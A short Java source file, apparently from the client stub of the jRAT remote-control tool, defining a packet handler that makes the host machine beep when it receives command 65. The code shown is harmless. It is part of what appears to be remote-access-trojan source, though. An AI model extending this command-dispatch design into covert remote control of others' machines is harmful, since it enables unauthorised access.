package io.jrat.stub.packets.incoming;

import java.awt.Toolkit;

public class Packet65Beep extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Toolkit.getDefaultToolkit().beep();
	}

}
